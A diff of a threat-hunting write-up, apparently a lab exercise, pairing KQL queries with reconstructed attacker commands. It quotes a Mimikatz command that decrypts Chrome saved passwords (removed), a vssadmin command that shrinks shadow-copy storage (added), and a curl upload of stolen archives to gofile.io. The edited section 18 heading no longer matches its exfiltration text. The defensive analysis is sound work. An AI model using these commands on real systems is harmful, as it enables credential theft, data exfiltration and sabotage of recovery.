@@ -341,30 +341,31 @@ DeviceProcessEvents
 
 ### 17. Impact: Storage Limitation
 
-Searched for evidence of...
-
-credential theft targeting browser password stores and discovered that the attacker utilized the following Mimikatz command to extract Chrome saved passwords by decrypting the Login Data database using Windows Data Protection API (DPAPI): "m.exe" privilege::debug "dpapi::chrome /in:%localappdata%\Google\Chrome\User Data\Default\Login Data /unprotect" exit. Note that dpapi::chrome is the Chrome credential extraction module and /unprotect is used to decrypt credentials using Windows DPAPI.
-
+Searched for evidence of storage limitation operations and discovered that the threat actor executed the following vssadmin resize command to place restrictions on shadow copy storage allocation: "vssadmin.exe" resize shadowstorage /for=C: /on=C: /maxsize=401MB. Therefore, shadow copy storage was restricted to a minimal 401MB, effectively preventing the creation of new shadow copies due to insufficient space allocation. This ensures that even if shadow copy services are restarted, no new recovery points can be created.
 
 **Query used to locate events:**
 
 ```kql
 DeviceProcessEvents
-| where TimeGenerated between (datetime(2025-11-23) .. datetime(2025-11-26))
-| where DeviceName == "azuki-adminpc"
-| where ProcessCommandLine has "chrome"
-| where FileName has_any ("m.exe","m-temp.exe")  
-| project TimeGenerated, FileName, ProcessCommandLine
-| order by TimeGenerated asc
+| where TimeGenerated between (datetime(2025-11-20) .. datetime(2025-11-28))
+| where DeviceName contains "azuki"
+| where FileName == "vssadmin.exe"
+| where ProcessCommandLine contains "resize" 
+    or ProcessCommandLine contains "maxsize"
+    or ProcessCommandLine contains "storage"
+| project TimeGenerated, DeviceName, AccountName, FileName, ProcessCommandLine
+| sort by TimeGenerated asc
 
 ```
-<img width="2573" height="284" alt="BT_Q21" src="https://github.com/user-attachments/assets/0545b6a1-8e3a-49d5-b327-bb4b2e65bc66" />
+<img width="2452" height="467" alt="DITW_Q20B" src="https://github.com/user-attachments/assets/fd97741f-7822-4012-b448-d2497b544f22" />
 
 ---
 
-### 18. Exfiltration: Data Upload & Cloud Storage Service
+### 18. Impact: Recovery Disabled
 
-Searched for evidence of data exfiltration and discovered the HTTP POST command used to upload stolen data archives to cloud storage. The attacker executed the following curl with form-based POST upload command to exfiltrate the first archive (credentials.tar.gz) to gofile.io: "curl.exe" -X POST -F file=@credentials.tar.gz https://store1.gofile.io/uploadFile. This command pattern was repeated for all the other archives. The exfiltration service domain (i.e., gofile.io), is an anonymous cloud storage service that provides temporary file hosting with self-destructing links. It is commonly used for malware distribution and data exfiltration due to no registration requirement and high-speed transfers.
+Searched for evidence of...
+
+data exfiltration and discovered the HTTP POST command used to upload stolen data archives to cloud storage. The attacker executed the following curl with form-based POST upload command to exfiltrate the first archive (credentials.tar.gz) to gofile.io: "curl.exe" -X POST -F file=@credentials.tar.gz https://store1.gofile.io/uploadFile. This command pattern was repeated for all the other archives. The exfiltration service domain (i.e., gofile.io), is an anonymous cloud storage service that provides temporary file hosting with self-destructing links. It is commonly used for malware distribution and data exfiltration due to no registration requirement and high-speed transfers.
 
 **Query used to locate events:**
 
